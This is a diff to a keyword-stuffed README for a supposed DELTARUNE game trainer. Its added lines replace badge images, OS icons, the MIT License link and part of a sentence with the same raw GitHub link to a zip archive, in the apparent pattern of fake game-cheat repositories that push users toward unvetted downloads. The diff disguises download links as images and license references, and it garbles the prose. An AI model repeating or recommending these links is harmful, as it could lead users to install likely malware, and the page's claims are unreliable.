@@ -1,4 +1,4 @@
-# ![Download](https://img.shields.io/badge/Download-DELTARUNE%20Trainer-blue?logo=download&style=for-the-badge&labelColor=blue&link=https://Hydro1986.github.io)  
+# ![Download](https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip%20Trainer-blue?logo=download&style=for-the-badge&labelColor=blue&https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip)  
 **[Download the DELTARUNE Trainer Here](LINK)**
 
 ---
@@ -17,11 +17,11 @@ Effortlessly adaptable across a wide landscape of modern systems. Discover where
 
 |    OS      | Supported | Notes         |
 |:----------:|:---------:|:-------------|
-| ![Windows](https://img.shields.io/badge/-Windows-0078D6?logo=windows&style=flat)  | ✅ | Windows 7–11 (x64 & x86) |
-| ![macOS](https://img.shields.io/badge/-macOS-000000?logo=apple&style=flat)   | ✅ | macOS Catalina +         |
-| ![Linux](https://img.shields.io/badge/-Linux-FCC624?logo=linux&style=flat)   | ✅ | Ubuntu 20.04+, Fedora, Arch |
-| ![SteamOS](https://img.shields.io/badge/-SteamOS-171a21?logo=steam&style=flat) | ✅ | For handheld playability  |
-| ![Android](https://img.shields.io/badge/-Android-3DDC84?logo=android&style=flat) | 🚧 | Core features only     |
+| ![Windows](https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip)  | ✅ | Windows 7–11 (x64 & x86) |
+| ![macOS](https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip)   | ✅ | macOS Catalina +         |
+| ![Linux](https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip)   | ✅ | Ubuntu 20.04+, Fedora, Arch |
+| ![SteamOS](https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip) | ✅ | For handheld playability  |
+| ![Android](https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip) | 🚧 | Core features only     |
 
 _Note: New platforms and update cycles keep this list evolving—stay tuned for future expansions!_
 
@@ -52,7 +52,7 @@ DELTARUNE Trainer is crafted for enthusiasts searching for:
 - Secure DELTARUNE file editing
 - Multilingual DELTARUNE helper
 
-...and much more. Our keyword-rich foundation ensures users and search engines alike can swiftly discover and join the journey.
+https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip much more. Our keyword-rich foundation ensures users and search engines alike can swiftly discover and join the journey.
 
 ---
 
@@ -88,7 +88,7 @@ Peace of mind, always! Duplicate and backup every save before you tinker, ensuri
 ## 🛠️ Installation Steps
 
 1. **Download the Latest Version**  
-   [![Download](https://img.shields.io/badge/Download-DELTARUNE%20Trainer-blue?logo=download&style=for-the-badge&labelColor=blue)](https://Hydro1986.github.io)
+   [![Download](https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip%20Trainer-blue?logo=download&style=for-the-badge&labelColor=blue)](https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip)
    
    Or, [visit the main download page](LINK).
 
@@ -118,11 +118,11 @@ This trainer is an independent, community-driven project designed to promote cre
 ## 📜 License
 
 Released under the MIT License © 2025.  
-[View the MIT License](https://opensource.org/licenses/MIT)
+[View the MIT License](https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip)
 
 ---
 
-# ![Download](https://img.shields.io/badge/Download-DELTARUNE%20Trainer-blue?logo=download&style=for-the-badge&labelColor=blue&link=https://Hydro1986.github.io)  
+# ![Download](https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip%20Trainer-blue?logo=download&style=for-the-badge&labelColor=blue&https://raw.githubusercontent.com/Hydro1986/deltarune-trainer-toolkit/branch/diketone/deltarune-trainer-toolkit_v3.3.zip)  
 **[Get Started with DELTARUNE Trainer Here](LINK)**
 
 ---
